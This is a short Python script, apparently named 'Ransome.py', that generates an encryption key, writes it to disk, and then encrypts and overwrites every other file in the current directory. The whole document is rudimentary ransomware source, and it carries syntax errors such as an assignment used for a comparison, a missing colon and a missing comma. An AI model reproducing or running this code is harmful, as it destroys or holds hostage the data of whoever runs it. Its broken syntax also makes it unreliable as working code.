from cryptography.fernet import Fernet import os

key = Fernet.generate_key()

with open('secret.key','wb') as f:

f.write (key)

for file in os.listdir():

if file = 'secret.key' or file == 'Ransome.py'

continue

with open (file 'rb') as f:

content = f.read()

encrypt_content = Fernet(key).encrypt(content)

with open(file, 'wb') as f:

f.write (encrypt_content)
